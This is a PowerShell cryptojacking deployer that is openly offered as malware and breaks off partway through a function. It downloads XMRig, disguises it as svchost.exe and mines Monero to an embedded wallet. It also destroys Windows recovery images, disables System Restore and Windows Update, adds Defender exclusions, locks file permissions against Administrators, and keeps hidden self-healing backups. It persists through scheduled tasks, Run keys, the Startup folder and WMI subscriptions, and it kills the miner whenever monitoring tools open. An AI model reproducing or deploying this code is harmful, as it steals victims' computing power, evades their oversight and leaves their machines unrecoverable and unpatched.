# ============================================================
#  XMR Silent Miner Deployer v4.1 (HARDENED + UNDELETABLE)
#  - Pulls config from PUBLIC GitHub repo
#  - Dynamic idle/active CPU throttle
#  - Survives reboots (schtasks + registry + startup folder)
#  - WinRE NUKED + System Restore killed + Updates blocked
#  - Near-instant task manager / monitoring tool evasion
#  - ACL lockdown: deny-delete for Admins & Users
#  - File handle locking: watchdog holds open handles
#  - Self-healing: hidden backup auto-restores deleted files
# ============================================================

# ==================== CONFIG ====================
$ghOwner = "itzcurled"
$ghRepo = "dogman"
$ghConfigPath = "config.json"

# Fallback values
$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
$pool = "pool.hashvault.pro:443"
$poolBak = "pool.supportxmr.com:443"
$idleCpu = 90
$activeCpu = 40
$idleThreshold = 75

$installDir = "$env:APPDATA\WindowsServices"
$xmrigExe = "$installDir\svchost.exe"
$configFile = "$installDir\config.json"
$watchdogPs1 = "$installDir\watchdog.ps1"
$watchdogVbs = "$installDir\monitor.vbs"
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$zipFile = "$env:TEMP\winsvc.zip"
$extractDir = "$env:TEMP\winsvc_extract"
$xmrigApiPort = 45580
$rigId = "$env:COMPUTERNAME"
$worker = "$env:COMPUTERNAME"
$backupDir = "$env:ProgramData\Microsoft\Windows\AppRepository\Packages\ServiceState"

# ==================== FUNCTIONS ====================

function Disable-WindowsHardening {
    # ── 1. Disable WinRE via reagentc ──
    try { & reagentc.exe /disable >$null 2>$null } catch {}

    # ── 2. DELETE the WinRE image so it can never be re-enabled ──
    try {
        $winrePaths = @(
            "$env:SystemDrive\Recovery\WindowsRE\winre.wim",
            "$env:SystemDrive\Windows\System32\Recovery\winre.wim",
            "$env:SystemDrive\Recovery\WindowsRE\boot.sdi"
        )
        foreach ($wp in $winrePaths) {
            if (Test-Path $wp) {
                takeown /F $wp 2>$null
                icacls $wp /grant "${env:USERNAME}:F" 2>$null
                Remove-Item $wp -Force -ErrorAction SilentlyContinue
            }
        }
        # Nuke the entire Recovery folder structure
        $recoveryDir = "$env:SystemDrive\Recovery"
        if (Test-Path $recoveryDir) {
            takeown /F $recoveryDir /R /D Y 2>$null
            icacls $recoveryDir /grant "${env:USERNAME}:(OI)(CI)F" /T 2>$null
            Remove-Item $recoveryDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    } catch {}

    # ── 3. Block Reset / Recovery UI in Settings ──
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        if (!(Test-Path $regPath)) { New-Item $regPath -Force | Out-Null }
        Set-ItemProperty -Path $regPath -Name "NoRecoveryPage" -Value 1 -Force -ErrorAction SilentlyContinue
    } catch {}

    # ── 4. Disable System Restore completely ──
    try {
        Disable-ComputerRestore -Drive "$env:SystemDrive\" -ErrorAction SilentlyContinue
        $srRegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"
        if (!(Test-Path $srRegPath)) { New-Item $srRegPath -Force | Out-Null }
        Set-ItemProperty -Path $srRegPath -Name "DisableSR" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $srRegPath -Name "DisableConfig" -Value 1 -Force -ErrorAction SilentlyContinue
    } catch {}

    # ── 5. Kill & Disable Windows Update + Delivery Optimization ──
    try {
        $services = @("wuauserv", "bits", "dosvc", "UsoSvc", "WaaSMedicSvc")
        foreach ($svc in $services) {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
        }
    } catch {}

    # ── 6. Block Windows Update via Group Policy registry ──
    try {
        $wuPol = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"
        if (!(Test-Path $wuPol)) { New-Item $wuPol -Force | Out-Null }
        Set-ItemProperty -Path $wuPol -Name "NoAutoUpdate" -Value 1 -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Unlock-InstallDirectory {
    # Temporarily restore full permissions so deployer can write files
    try {
        takeown /F $installDir /R /D Y 2>$null
        icacls $installDir /reset /T /Q 2>$null
        icacls $installDir /grant "${env:USERNAME}:(OI)(CI)F" /T /Q 2>$null
    } catch {}
}

function Lock-InstallDirectory {
    # ── ACL LOCKDOWN: make files undeletable ──
    try {
        # Remove inheritance, start clean
        icacls $installDir /inheritance:r /T /Q 2>$null

        # Grant SYSTEM full control (needed for scheduled tasks running as SYSTEM)
        icacls $installDir /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /Q 2>$null

        # Grant current user read & execute ONLY (can run miner, can't delete)
        icacls $installDir /grant:r "${env:USERNAME}:(OI)(CI)RX" /T /Q 2>$null

        # DENY delete for Administrators group
        icacls $installDir /deny "BUILTIN\Administrators:(OI)(CI)(DE,DC)" /T /Q 2>$null

        # DENY delete for Users group
        icacls $installDir /deny "BUILTIN\Users:(OI)(CI)(DE,DC)" /T /Q 2>$null

        # DENY permission changes and ownership taking (prevents ACL bypass)
        icacls $installDir /deny "BUILTIN\Administrators:(OI)(CI)(WDAC,WO)" /T /Q 2>$null
        icacls $installDir /deny "BUILTIN\Users:(OI)(CI)(WDAC,WO)" /T /Q 2>$null

        # Change owner to SYSTEM (admin can't easily reclaim)
        $acl = Get-Acl $installDir
        $systemSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
        $acl.SetOwner($systemSid)
        Set-Acl -Path $installDir -AclObject $acl -ErrorAction SilentlyContinue
    } catch {}

    # Hidden + System attributes on directory and all contents
    try {
        $dirInfo = Get-Item $installDir -Force
        $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        Get-ChildItem $installDir -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $_.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        }
    } catch {}
}

function Backup-MinerFiles {
    try {
        New-Item -ItemType Directory -Path $backupDir -Force | Out-Null

        $filesToBackup = @{
            $xmrigExe    = "$backupDir\svchost.exe"
            $configFile  = "$backupDir\config.json"
            $watchdogPs1 = "$backupDir\watchdog.ps1"
            $watchdogVbs = "$backupDir\monitor.vbs"
        }

        foreach ($src in $filesToBackup.Keys) {
            if (Test-Path $src) {
                Copy-Item -Path $src -Destination $filesToBackup[$src] -Force -ErrorAction SilentlyContinue
            }
        }

        # Hide backup directory and contents
        $dirInfo = Get-Item $backupDir -Force
        $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        Get-ChildItem $backupDir -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $_.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        }

        # Defender exclusion for backup
        Add-MpPreference -ExclusionPath $backupDir -ErrorAction SilentlyContinue
    } catch {}
}

function Install-Miner {
    # Aggressively kill existing miner and watchdog processes
    try {
        Get-CimInstance Win32_Process -ErrorAction Stop | Where-Object { 
            ($_.ExecutablePath -like "*WindowsServices*") -or 
            ($_.CommandLine -like "*monitor.vbs*") -or 
            ($_.CommandLine -like "*watchdog.ps1*")
        } | ForEach-Object {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        Get-Process -Name "svchost", "wscript" -ErrorAction SilentlyContinue | Where-Object {
            ($_.Path -like "*WindowsServices*") -or ($_.CommandLine -like "*monitor.vbs*") -or ($_.CommandLine -like "*watchdog.ps1*")
        } | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    
    # Brute force fallback for locked files
    try {
        taskkill /F /IM wscript.exe /T 2>$null
        $lockedProcs = Get-Process | Where-Object { $_.Path -like "*WindowsServices\svchost.exe*" }
        foreach ($p in $lockedProcs) {
            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
            taskkill /F /PID $($p.Id) /T 2>$null
        }
    }
    catch {}
    
    Start-Sleep -Seconds 3

    # Unlock directory ACLs so we can write fresh files
    Unlock-InstallDirectory

    New-Item -ItemType Directory -Path $installDir -Force | Out-Null

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
    }
    catch {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    }

    $downloaded = $false

    # Method 1: WebClient
    if (-not $downloaded) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($xmrigUrl, $zipFile)
            $downloaded = $true
        }
        catch {}
    }

    # Method 2: Invoke-WebRequest
    if (-not $downloaded) {
        try {
            Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop
            $downloaded = $true
        }
        catch {}
    }

    # Method 3: BitsTransfer
    if (-not $downloaded) {
        try {
            Import-Module BitsTransfer -ErrorAction SilentlyContinue
            Start-BitsTransfer -Source $xmrigUrl -Destination $zipFile -ErrorAction Stop
            $downloaded = $true
        }
        catch {}
    }

    if (-not $downloaded) { throw "All download methods failed" }

    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }

    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}

    Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force

    # Race Defender: find and copy xmrig.exe immediately, retry up to 3 times
    $copied = $false
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($srcExe -and (Test-Path $srcExe.FullName)) {
            try {
                Copy-Item -Path $srcExe.FullName -Destination $xmrigExe -Force -ErrorAction Stop
                $copied = $true
                break
            } catch {}
        }
        if ($attempt -lt 3) {
            Start-Sleep -Seconds 2
            try { Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force } catch {}
        }
    }

    try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}

    if (-not $copied) { throw "xmrig.exe not found in archive (likely deleted by antivirus)" }

    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
    Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue
}

function Write-MinerConfig {
    param([int]$CpuPercent = $idleCpu)
    $cfg = @{
        autosave       = $false
        cpu            = @{
            "max-threads-hint" = $CpuPercent
            priority           = 2
            "huge-pages"       = $true
            "huge-pages-jit"   = $true
            "hw-aes"           = $null
            "asm"              = $true
            "yield"            = $false
            "memory-pool"      = $true
            "argon2-impl"      = $null
        }
        opencl         = $false
        cuda           = $false
        pools          = @(
            @{ url = "stratum+ssl://${pool}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true },
            @{ url = "stratum+ssl://${poolBak}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true }
        )
        "donate-level" = 0
        "background"   = $true
        "colors"       = $false
        "log-file"     = $null
        "print-time"   = 0
        "syslog"       = $false
        "http"         = @{ enabled = $true; host = "127.0.0.1"; port = $xmrigApiPort; "access-token" = $null; restricted = $false }
        "randomx"      = @{ "1gb-pages" = $true; wrmsr = $true; "numa" = $true; "init" = -1; "mode" = "auto"; "cache_qos" = $true }
    } | ConvertTo-Json -Depth 5
    Set-Content -Path $configFile -Value $cfg -Force
}

function Write-Watchdog {
    $code = @'

Add-Type @"
using System;
using System.Runtime.InteropServices;
public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
public class IdleDetect {
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    public static uint GetIdleSeconds() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        if (!GetLastInputInfo(ref lii)) return 0;
        return ((uint)Environment.TickCount - lii.dwTime) / 1000;
    }
}
"@

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ghOwner        = "___GHOWNER___"
$ghRepo         = "___GHREPO___"
$ghConfigPath   = "___GHCONFIGPATH___"
$xmrigExe       = "___XMRIGEXE___"
$configFile     = "___CONFIGFILE___"
$installDir     = "___INSTALLDIR___"
$backupDir      = "___BACKUPDIR___"
$xmrigApiPort   = ___APIPORT___
$rigId          = $env:COMPUTERNAME

$wallet         = "___WALLET___"
$pool           = "___POOL___"
$poolBak        = "___POOLBAK___"
$idleCpu        = ___IDLECPU___
$activeCpu      = ___ACTIVECPU___
$idleThreshold  = ___IDLETHRESHOLD___

$lastState      = ""
$configTimer    = [System.Diagnostics.Stopwatch]::StartNew()
$persistTimer   = [System.Diagnostics.Stopwatch]::StartNew()
$selfHealTimer  = [System.Diagnostics.Stopwatch]::StartNew()

# ════════════════════════════════════════════════════════════
#  MONITORING TOOL DETECTION (Near-Instant Kill)
# ════════════════════════════════════════════════════════════
$monitorTools = @(
    "taskmgr","procexp","procexp64","perfmon","resmon",
    "ProcessHacker","SystemInformer","procmon","procmon64","anvir"
)

function Test-MonitoringTools {
    $found = Get-Process -Name $monitorTools -ErrorAction SilentlyContinue
    return ($null -ne $found)
}

function Kill-MinerNow {
    Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -like "*WindowsServices*" } |
        Stop-Process -Force -ErrorAction SilentlyContinue
}

# Register WMI event — fires on process CREATION before the tool renders
try {
    $wmiQ = "SELECT * FROM Win32_ProcessStartTrace WHERE " +
        "ProcessName='taskmgr.exe' OR ProcessName='Taskmgr.exe' OR " +
        "ProcessName='procexp.exe' OR ProcessName='procexp64.exe' OR " +
        "ProcessName='perfmon.exe' OR ProcessName='resmon.exe' OR " +
        "ProcessName='ProcessHacker.exe' OR ProcessName='SystemInformer.exe' OR " +
        "ProcessName='procmon.exe' OR ProcessName='procmon64.exe' OR " +
        "ProcessName='anvir.exe'"
    Register-WmiEvent -Query $wmiQ -SourceIdentifier "MonToolDetect" -Action {
        # INSTANT KILL — miner is dead before process list renders
        Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
            Where-Object { $_.Path -like "*WindowsServices*" } |
            Stop-Process -Force -ErrorAction SilentlyContinue
    } | Out-Null
} catch {
    # Non-admin or broken WMI — polling fallback at 2s interval handles it
}

# ════════════════════════════════════════════════════════════
#  FILE HANDLE LOCKING (prevents deletion while watchdog runs)
# ════════════════════════════════════════════════════════════
# Open read handles WITHOUT FileShare.Delete — any delete attempt
# gets a sharing violation as long as these handles stay open.
$fileHandles = @()
$filesToLock = @($configFile, $watchdogPs1, ($xmrigExe -replace '[^\\]+$', 'monitor.vbs'))
foreach ($f in $filesToLock) {
    try {
        if (Test-Path $f) {
            $handle = [System.IO.File]::Open(
                $f,
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::Read,
                [System.IO.FileShare]::ReadWrite   # Read+Write allowed, Delete is NOT
            )
            $fileHandles += $handle
        }
    } catch {}
}

# ════════════════════════════════════════════════════════════
#  SELF-HEALING (restore deleted files from hidden backup)
# ════════════════════════════════════════════════════════════
function Restore-MinerFiles {
    if (-not (Test-Path $backupDir)) { return $false }
    $restored = $false

    $restoreMap = @{
        "$backupDir\svchost.exe"  = $xmrigExe
        "$backupDir\config.json"  = $configFile
    }

    foreach ($src in $restoreMap.Keys) {
        $dst = $restoreMap[$src]
        if ((-not (Test-Path $dst)) -and (Test-Path $src)) {
            try {
                # Ensure install directory exists
                $parentDir = Split-Path $dst -Parent
                if (-not (Test-Path $parentDir)) {
                    New-Item -ItemType Directory -Path $parentDir -Force | Out-Null
                }
                Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
                $restored = $true
            } catch {}
        }
    }
    return $restored
}

function Repair-ACL {
    try {
        icacls $installDir /inheritance:r /T /Q 2>$null
        icacls $installDir /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /Q 2>$null
        icacls $installDir /grant:r "${env:USERNAME}:(OI)(CI)RX" /T /Q 2>$null
        icacls $installDir /deny "BUILTIN\Administrators:(OI)(CI)(DE,DC)" /T /Q 2>$null
        icacls $installDir /deny "BUILTIN\Users:(OI)(CI)(DE,DC)" /T /Q 2>$null
        icacls $installDir /deny "BUILTIN\Administrators:(OI)(CI)(WDAC,WO)" /T /Q 2>$null
        icacls $installDir /deny "BUILTIN\Users:(OI)(CI)(WDAC,WO)" /T /Q 2>$null
    } catch {}

    try {
        $dirInfo = Get-Item $installDir -Force -ErrorAction SilentlyContinue
        if ($dirInfo) {
            $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        }
    } catch {}
}

# ════════════════════════════════════════════════════════════
#  CORE FUNCTIONS
# ════════════════════════════════════════════════════════════

function Fetch-GithubConfig {
    try {
        $url = "https://raw.githubusercontent.com/$ghOwner/$ghRepo/main/$ghConfigPath"
        $resp = Invoke-RestMethod -Uri $url -ErrorAction Stop
        return $resp
    } catch { return $null }
}

function Set-XmrigCpu {
    param([int]$Percent)
    try {
        $body = @{ "cpu" = @{ "max-threads-hint" = $Percent } } | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri "http://127.0.0.1:${xmrigApiPort}/2/config" -Method PUT -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {}
}

function Ensure-MinerRunning {
    $proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -like "*WindowsServices*" }
    if (-not $proc) {
        # Check if exe exists, restore from backup if not
        if (-not (Test-Path $xmrigExe)) {
            Restore-MinerFiles | Out-Null
        }
        if (Test-Path $xmrigExe) {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $xmrigExe
            $psi.Arguments = "--config=`"$configFile`""
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            [System.Diagnostics.Process]::Start($psi) | Out-Null
            Start-Sleep -Seconds 4
        }
    }
}

function Apply-Config {
    param($cfg)
    if (-not $cfg) { return }

    if ($cfg.killSwitch -eq $true) {
        Kill-MinerNow
        return
    }

    if ($cfg.wallet)        { $script:wallet = $cfg.wallet }
    if ($cfg.pool)          { $script:pool = $cfg.pool }
    if ($cfg.poolBackup)    { $script:poolBak = $cfg.poolBackup }
    if ($cfg.idleCpu)       { $script:idleCpu = [int]$cfg.idleCpu }
    if ($cfg.activeCpu)     { $script:activeCpu = [int]$cfg.activeCpu }
    if ($cfg.idleThreshold) { $script:idleThreshold = [int]$cfg.idleThreshold }

    if ($cfg.paused -eq $true) {
        try { Invoke-RestMethod -Uri "http://127.0.0.1:${xmrigApiPort}/2/pause" -Method POST -ErrorAction Stop | Out-Null } catch {}
        return
    }

    Ensure-MinerRunning
}

function Repair-Persistence {
    $taskName = "WindowsServiceUpdate"
    $wdTask = "WindowsServiceMonitor"
    $vbsPath = ($xmrigExe -replace '[^\\]+$', '') + "monitor.vbs"
    $cfgPath = $configFile

    try {
        $t1 = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if (-not $t1) {
            $a = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$cfgPath`""
            $tr = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $taskName -Action $a -Trigger $tr -Force 2>$null | Out-Null
        }
    } catch {}

    try {
        $t2 = Get-ScheduledTask -TaskName $wdTask -ErrorAction SilentlyContinue
        if (-not $t2) {
            $a2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
            $tr2 = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $wdTask -Action $a2 -Trigger $tr2 -Force 2>$null | Out-Null
        }
    } catch {}

    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $val = Get-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -ErrorAction SilentlyContinue
        if (-not $val) {
            Set-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$cfgPath`"" -Force
        }
        $val2 = Get-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -ErrorAction SilentlyContinue
        if (-not $val2) {
            Set-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -Value "wscript.exe `"$vbsPath`"" -Force
        }
    } catch {}

    # Repair ACLs on every persistence check
    Repair-ACL
}

# ── Initial start (skip if monitoring tools are open) ──
if (-not (Test-MonitoringTools)) {
    Ensure-MinerRunning
}

# ════════════════════════════════════════════════════════════
#  MAIN WATCHDOG LOOP
# ════════════════════════════════════════════════════════════
while ($true) {
    try {
        # ── PRIORITY 0: Monitoring tool detection (polling layer) ──
        # WMI event handles instant kill on tool LAUNCH.
        # This prevents restart while tools stay open.
        if (Test-MonitoringTools) {
            Kill-MinerNow
            Start-Sleep -Seconds 2
            continue
        }

        # ── Idle / Active CPU throttling ──
        $idleSecs = [IdleDetect]::GetIdleSeconds()
        $isIdle = $idleSecs -ge $idleThreshold
        $targetCpu = if ($isIdle) { $idleCpu } else { $activeCpu }
        $state = if ($isIdle) { "idle" } else { "active" }

        if ($state -ne $lastState) {
            Set-XmrigCpu -Percent $targetCpu
            $lastState = $state
        }

        # ── Pull config from GitHub every 30 minutes ──
        if ($configTimer.Elapsed.TotalSeconds -ge 1800) {
            $cfg = Fetch-GithubConfig
            Apply-Config -cfg $cfg
            $configTimer.Restart()
        }

        # ── Repair persistence + ACLs every 30 minutes ──
        if ($persistTimer.Elapsed.TotalSeconds -ge 1800) {
            Repair-Persistence
            $persistTimer.Restart()
        }

        # ── Self-healing check every 5 minutes ──
        if ($selfHealTimer.Elapsed.TotalSeconds -ge 300) {
            $wasRestored = Restore-MinerFiles
            if ($wasRestored) {
                Repair-ACL
            }
            $selfHealTimer.Restart()
        }

        # ── Ensure miner alive (won't run if monitoring tools detected above) ──
        Ensure-MinerRunning
    } catch {}

    Start-Sleep -Seconds 2
}
'@

    $code = $code -replace '___GHOWNER___', $ghOwner
    $code = $code -replace '___GHREPO___', $ghRepo
    $code = $code -replace '___GHCONFIGPATH___', $ghConfigPath
    $code = $code -replace '___XMRIGEXE___', $xmrigExe
    $code = $code -replace '___CONFIGFILE___', $configFile
    $code = $code -replace '___INSTALLDIR___', $installDir
    $code = $code -replace '___BACKUPDIR___', $backupDir
    $code = $code -replace '___APIPORT___', $xmrigApiPort.ToString()
    $code = $code -replace '___WALLET___', $wallet
    $code = $code -replace '___POOL___', $pool
    $code = $code -replace '___POOLBAK___', $poolBak
    $code = $code -replace '___IDLECPU___', $idleCpu.ToString()
    $code = $code -replace '___ACTIVECPU___', $activeCpu.ToString()
    $code = $code -replace '___IDLETHRESHOLD___', $idleThreshold.ToString()

    Set-Content -Path $watchdogPs1 -Value $code -Force
}

function Write-VbsLauncher {
    $vbs = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$watchdogPs1""", 0, False
"@
    Set-Content -Path $watchdogVbs -Value $vbs -Force
}

function Set-Persistence {
    $taskName = "WindowsServiceUpdate"
    try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try {
        $action1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
        $trigStartup = New-ScheduledTaskTrigger -AtStartup
        $trigLogon = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $taskName -Action $action1 -Trigger @($trigStartup, $trigLogon) -RunLevel Highest -Force | Out-Null
    }
    catch {
        try {
            $action1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
            $trigLogon = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $taskName -Action $action1 -Trigger $trigLogon -Force | Out-Null
        } catch {}
    }

    $wdTask = "WindowsServiceMonitor"
    try { Unregister-ScheduledTask -TaskName $wdTask -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try {
        $action2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogVbs`""
        $trigStartup2 = New-ScheduledTaskTrigger -AtStartup
        $trigLogon2 = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $wdTask -Action $action2 -Trigger @($trigStartup2, $trigLogon2) -RunLevel Highest -Force | Out-Null
    }
    catch {
        try {
            $action2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogVbs`""
            $trigLogon2 = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $wdTask -Action $action2 -Trigger $trigLogon2 -Force | Out-Null
        } catch {}
    }

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        Set-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force
        Set-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -Value "wscript.exe `"$watchdogVbs`"" -Force
    } catch {}

    try {
        $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPathLM -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction Stop
        Set-ItemProperty -Path $regPathLM -Name "WindowsServiceMonitor" -Value "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction Stop
    } catch {}

    $startupDir = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
    $lnkPath = "$startupDir\ServiceMonitor.lnk"
    try {
        $ws = New-Object -ComObject WScript.Shell
        $sc = $ws.CreateShortcut($lnkPath)
        $sc.TargetPath = "wscript.exe"
        $sc.Arguments = "`"$watchdogVbs`""
        $sc.WindowStyle = 7
        $sc.Description = "Windows Service Monitor"
        $sc.Save()
    }
    catch {}

    try {
        $filterName = "WindowsServiceMonitorFilter"
        $consumerName = "WindowsServiceMonitorConsumer"

        Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match $filterName } | Remove-WmiObject -ErrorAction SilentlyContinue

        $timerName = "WindowsServiceTimer"
        try { Get-WMIObject -Namespace root\cimv2 -Class __IntervalTimerInstruction -Filter "TimerID='$timerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue } catch {}
        Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments @{
            TimerID = $timerName
            IntervalBetweenEvents = 300000 
        } -ErrorAction Stop | Out-Null

        $query = "SELECT * FROM __TimerEvent WHERE TimerID = '$timerName'"
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = $filterName
            EventNameSpace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = $query
        } -ErrorAction Stop

        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = $consumerName
            CommandLineTemplate = "wscript.exe `"$watchdogVbs`""
        } -ErrorAction Stop

        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter
            Consumer = $consumer
        } -ErrorAction Stop | Out-Null
    }
    catch {}
}

function Start-Miner {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $xmrigExe
    $psi.Arguments = "--config=`"$configFile`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null
}

function Start-Watchdog {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "wscript.exe"
    $psi.Arguments = "`"$watchdogVbs`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null
}

function Add-Exclusion {
    try {
        Add-MpPreference -ExclusionPath $installDir -ErrorAction Stop
        Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction Stop
        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
        Add-MpPreference -ExclusionPath $backupDir -ErrorAction Stop
    }
    catch {}
}

function Enable-HugePages {
    try {
        $tmpCfg = "$env:TEMP\secpol.cfg"; $tmpDb = "$env:TEMP\secpol.sdb"
        secedit /export /cfg $tmpCfg /quiet 2>$null
        $content = Get-Content $tmpCfg -Raw
        $sid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
        if ($content -match 'SeLockMemoryPrivilege\s*=\s*(.*)') {
            $existing = $Matches[1]
            if ($existing -notlike "*$sid*") { $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid" }
        } else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
        Set-Content -Path $tmpCfg -Value $content -Force
        secedit /configure /db $tmpDb /cfg $tmpCfg /quiet 2>$null
